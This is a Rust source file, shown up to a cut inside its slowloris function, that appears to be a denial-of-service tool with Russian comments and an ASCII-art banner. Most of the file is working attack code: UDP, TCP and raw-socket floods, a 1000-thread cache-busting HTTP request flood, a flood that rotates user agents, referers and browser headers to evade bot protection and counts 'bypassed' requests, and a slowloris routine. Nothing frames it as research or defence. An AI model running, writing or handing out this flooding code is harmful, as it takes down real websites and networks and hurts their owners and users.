use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};
use std::io::{self, Write};
use std::net::{TcpStream, UdpSocket, ToSocketAddrs};
use std::thread;
use reqwest::blocking::{Client};
use rand::Rng;
use rand::seq::SliceRandom;
use colored::*;
use socket2::{Socket, Domain, Type, Protocol};

// ==================== ГЛОБАЛЬНЫЕ СТАТЫ ====================
struct AttackStats {
    sent: AtomicU64,
    success: AtomicU64,
    failed: AtomicU64,
    bypassed: AtomicU64,
}

// ==================== КОНСТАНТЫ ЦВЕТОВ ====================
const MANSORY_COLOR: Color = Color::Magenta;
const BORDER_COLOR: Color = Color::BrightMagenta;
const SUCCESS_COLOR: Color = Color::BrightGreen;
const ERROR_COLOR: Color = Color::BrightRed;
const INFO_COLOR: Color = Color::BrightCyan;
const WARNING_COLOR: Color = Color::BrightYellow;

// ==================== БАННЕР ====================
const BANNER_FULL: &str = r#"
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⢰⠇⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢸⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠁⠀⠀⠀⠀⡇⢸⢸⡇⠇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠇⢀⡇⢸⣸⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢀⠀⠃⢸⢠⢸⣿⢸⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠰⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⢸⢸⢠⠀⣾⢸⢸⣿⢸⢀⢠⠀⡆⡇⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⢃⠀⢀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠁⠘⢸⢸⠀⡏⣿⢸⣿⢸⡘⢸⡀⡇⡇⡀⠀⠀⠀⠄⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⢄⠀⠀⢀⠀⠀⢢⡀⠀⠀⠀⢰⠀⣸⢸⢴⣇⡟⣾⣿⢸⣿⢸⡇⡇⡇⡇⠰⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠐⢄⠘⢄⠀⠣⡀⠀⠑⢄⠀⠱⣄⠁⡄⠆⣇⢿⢸⣾⣿⣇⣿⣿⣼⣿⣸⢷⡇⣼⢀⠀⠀⣠⠊⠀⣠⠆⠀⠀⠀⠁⠡⠎⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⠀⠀⠀⡑⢄⠀⠁⠀⠑⢄⠙⢦⡀⠢⠙⡦⣈⢧⡻⣜⠼⣜⢯⣿⣿⣿⣿⣿⣿⣿⣿⣼⣹⢣⢣⢡⠞⣁⣴⠞⡁⠀⠀⠀⡠⠀⠀⠤⠀⠀⠀⠀⠀⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠠⡈⠒⠥⣀⠀⠐⠄⡉⠢⣝⡲⢬⡪⣎⢧⠽⠟⡺⠿⠛⠋⠉⠉⠉⠉⠉⠙⠛⠛⠿⣟⡻⢷⣾⣫⠥⡺⠕⣀⠤⡊⠀⢠⠀⢀⡠⠂⢀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠒⠤⣀⠑⠢⠬⣽⣒⠤⠈⠒⡦⢭⣟⠚⣩⠰⠊⠁⠀⠀⠀⢀⡀⡀⠀⠀⠀⠀⠀⠀⢀⠀⠉⠓⢮⣝⡳⢻⣭⠖⣋⠠⣀⡴⠞⡩⠄⠚⠁⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⢀⡀⠈⠀⠀⠀⠈⠁⠒⠀⠬⠍⠛⠛⣚⣩⡆⠋⠁⣀⣴⣶⠏⣠⡞⣡⣶⣶⣶⡄⠀⠀⠀⠀⠀⠻⣷⣦⣀⠈⠛⢶⣬⣓⣒⢛⣃⣉⠠⠔⠀⠠⠂⠁⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠠⠀⠀⠀⠈⠁⠐⠢⠤⣁⣒⣒⣛⣂⣶⡟⠟⠉⢀⣤⣾⣿⣿⡏⢠⢶⡃⢿⣿⣿⠿⠁⠀⠀⠀⠀⠀⠀⢹⣿⣿⣷⣤⠀⠈⠻⢯⣟⣂⣂⣒⣒⣒⣈⡩⠥⠐⠈⠁⠀⠀⠠⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠐⠒⣒⣛⣿⣿⣛⠉⠀⠀⠠⣾⣿⣿⣿⣿⡅⢊⠎⣹⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⠀⠀⠀⠉⣛⠒⢲⠆⠡⠤⠤⠤⠒⠒⠀⠈⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠈⠀⡀⠠⠤⠐⠒⠒⣒⠒⠚⠳⠼⠛⠿⣶⣥⡠⡀⠙⢿⣿⣿⣿⣇⠀⠘⠄⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⣿⣿⣿⠟⠃⠀⢀⣴⣶⠿⠛⢿⣽⣛⠋⣉⣉⠉⠒⠒⠒⠂⠐⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠒⠀⠩⠉⠀⠉⠉⢑⡚⢛⢋⠸⠝⠿⣮⣔⠄⡈⠛⠿⣿⣄⠈⠀⠁⠂⠄⠀⠀⠀⠀⠀⠀⢀⣼⣿⠿⠛⢁⢀⣠⣾⡻⠯⠭⣉⡙⠓⠚⠥⢄⡀⠀⠀⠈⠉⠐⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠤⠄⠀⠤⠐⠀⠈⢉⡠⠄⣀⠤⠒⣈⡭⠾⢙⡿⣾⣤⣂⠀⣉⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠊⣉⠠⣀⣬⡶⢿⣟⠯⢍⡛⠶⡤⠉⠑⠢⢄⠀⠀⠉⠀⠂⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠒⡡⠔⠈⠀⠢⠋⠁⠂⠀⣡⠴⢃⣵⢟⡟⣷⣾⣿⣶⣶⣤⣤⣤⣴⣶⣦⣬⡷⣶⢿⢯⡳⣌⠢⢍⠛⠦⠌⠑⠠⠀⠀⠲⠤⡉⠢⠀⠈⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⠀⠄⠀⠀⠁⠘⢁⢀⠔⠁⠁⣽⢣⣇⡏⡏⣿⡟⣿⣿⢿⣿⣿⢸⡵⢹⣯⠆⠑⢜⢣⡀⠉⠢⣈⠂⠀⠀⠀⠀⠀⠀⠂⡀⠀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠔⠀⠀⡠⠈⠀⠀⠀⣰⠑⢸⣹⢹⢿⣿⡇⣿⣿⢸⡟⢸⠈⣷⠁⠙⢇⠀⠀⠀⠙⢦⡀⠈⠃⢄⠀⠀⠀⠐⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⡀⠁⠀⠀⠀⠀⠀⠀⠀⠁⠃⠇⢸⢸⢸⠸⡏⡇⢸⣿⢸⣧⢨⠀⡝⡏⠀⠈⠂⠀⠀⠀⢀⠀⠀⠀⡀⠑⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠀⠀⠀⠀⠀⠀⡸⢸⢸⠀⣧⢿⢸⣿⠀⣿⠈⠀⠇⡇⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⠀⢁⠘⠀⡀⠸⡌⢸⣿⠀⡏⠀⢀⠀⡄⠀⣤⠀⠀⠀⠐⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⡀⠇⠸⠃⢸⣿⠀⠇⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠈⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⠀⠀⠀⠁⠀⠂⠸⡟⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠂⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"#;

// ==================== БАЗЫ ДАННЫХ ДЛЯ ОБХОДА ====================
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
];

const REFERERS: &[&str] = &[
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "",
];

const ACCEPTS: &[&str] = &[
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
];

// ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
fn print_border() {
    println!("{}", "═".repeat(70).color(BORDER_COLOR));
}

fn resolve_host(host: &str) -> Option<String> {
    let host = host.replace("https://", "").replace("http://", "").replace("/", "");
    if let Ok(addr) = host.parse::<std::net::IpAddr>() {
        return Some(addr.to_string());
    }
    let addr = format!("{}:80", host).to_socket_addrs().ok()?.next()?;
    Some(addr.ip().to_string())
}

// ==================== ФУНКЦИИ АТАК ====================
fn udp_flood(target: String, port: u16, stats: Arc<AttackStats>) {
    let addr = format!("{}:{}", target, port);
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    let data = vec![0x41u8; 1472];
    
    loop {
        for _ in 0..100 {
            if socket.send_to(&data, &addr).is_ok() {
                stats.sent.fetch_add(1, Ordering::Relaxed);
                stats.success.fetch_add(1, Ordering::Relaxed);
            } else {
                stats.failed.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
}

fn tcp_flood(target: String, port: u16, stats: Arc<AttackStats>) {
    let addr = format!("{}:{}", target, port);
    let data = vec![0u8; 65535];
    
    loop {
        if let Ok(mut stream) = TcpStream::connect(&addr) {
            stream.set_nodelay(true).unwrap();
            let _ = stream.write(&data);
            stats.sent.fetch_add(1, Ordering::Relaxed);
            stats.success.fetch_add(1, Ordering::Relaxed);
        } else {
            stats.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
}

fn raw_udp_flood(target: String, port: u16, stats: Arc<AttackStats>) {
    let socket = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP)).unwrap();
    let addr: std::net::SocketAddr = format!("{}:{}", target, port).parse().unwrap();
    let data = vec![0x41u8; 1472];
    
    loop {
        for _ in 0..100 {
            if socket.send_to(&data, &addr.into()).is_ok() {
                stats.sent.fetch_add(1, Ordering::Relaxed);
                stats.success.fetch_add(1, Ordering::Relaxed);
            } else {
                stats.failed.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
}

fn raw_rps_flood(url: String, stats: Arc<AttackStats>) {
    let client = Client::builder()
        .timeout(Duration::from_secs(4))
        .danger_accept_invalid_certs(true)
        .pool_max_idle_per_host(500)
        .build()
        .unwrap();

    // 1000 потоков по умолчанию
    let threads = 1000;
    let mut handles = vec![];

    for _ in 0..threads {
        let c = client.clone();
        let u = url.clone();
        let s = stats.clone();
        
        handles.push(thread::spawn(move || {
            loop {
                let target = {
                    let mut rng = rand::thread_rng();
                    let cb: String = (0..7).map(|_| rng.gen_range(b'a'..b'z') as char).collect();
                    if u.contains('?') {
                        format!("{}&{}={}", u, cb, cb)
                    } else {
                        format!("{}?{}={}", u, cb, cb)
                    }
                };

                let ua = USER_AGENTS.choose(&mut rand::thread_rng()).unwrap();
                
                if c.get(&target)
                    .header("User-Agent", *ua)
                    .header("Cache-Control", "no-cache")
                    .header("Pragma", "no-cache")
                    .send()
                    .is_ok() {
                    s.sent.fetch_add(1, Ordering::Relaxed);
                    s.success.fetch_add(1, Ordering::Relaxed);
                } else {
                    s.failed.fetch_add(1, Ordering::Relaxed);
                }
                
                thread::sleep(Duration::from_millis(2));
            }
        }));
    }
    
    // Держим потоки живыми
    for h in handles {
        h.join().ok();
    }
}

fn http_flood(url: String, stats: Arc<AttackStats>) {
    let client = Client::builder()
        .tcp_nodelay(true)
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    
    loop {
        let target = format!("{}?cb={}", url, rand::thread_rng().gen::<u64>());
        if client.get(&target).send().is_ok() {
            stats.sent.fetch_add(1, Ordering::Relaxed);
            stats.success.fetch_add(1, Ordering::Relaxed);
        } else {
            stats.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
}

fn cfb_flood(url: String, stats: Arc<AttackStats>) {
    let client = Client::builder()
        .tcp_nodelay(true)
        .cookie_store(true)
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    
    let _ = client.get(&url).send();
    
    loop {
        let target = format!("{}?cb={}", url, rand::thread_rng().gen::<u64>());
        
        let ua = USER_AGENTS.choose(&mut rand::thread_rng()).unwrap();
        let referer = REFERERS.choose(&mut rand::thread_rng()).unwrap();
        let accept = ACCEPTS.choose(&mut rand::thread_rng()).unwrap();
        
        let mut request = client.get(&target)
            .header("User-Agent", *ua)
            .header("Accept", *accept)
            .header("Accept-Encoding", "gzip, deflate, br")
            .header("Cache-Control", "no-cache")
            .header("Sec-Ch-Ua", "\"Chromium\";v=\"124\"")
            .header("Sec-Fetch-Dest", "document")
            .header("Sec-Fetch-Mode", "navigate")
            .header("Sec-Fetch-Site", if referer.is_empty() { "none" } else { "cross-site" });
        
        if !referer.is_empty() {
            request = request.header("Referer", *referer);
        }
        
        if request.send().is_ok() {
            stats.sent.fetch_add(1, Ordering::Relaxed);
            stats.success.fetch_add(1, Ordering::Relaxed);
            stats.bypassed.fetch_add(1, Ordering::Relaxed);
        } else {
            stats.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
}

fn slowloris(target: String, port: u16, stats: Arc<AttackStats>) {
    let addr = format!("{}:{}", target, port);
    loop {
        if let Ok(mut stream) = TcpStream::connect(&addr) {
            stream.set_nodelay(true).unwrap();
            let _ = stream.write(b"GET / HTTP/1.1\r\nHost: ");
            let _ = stream.write(target.as_bytes());
            let _ = stream.write(b"\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n");
            let _ = stream.write(b"X-Keep-Alive: ");
            let _ = stream.write(rand::thread_rng().gen::<u64>().to_string().as_bytes());
            let _ = stream.write(b"\r\n");
            stats.sent.fetch_add(1, Ordering::Relaxed);
            stats.success.fetch_add(1, Ordering::Relaxed);
            thread::sleep(Duration::from_secs(10));
        } else {
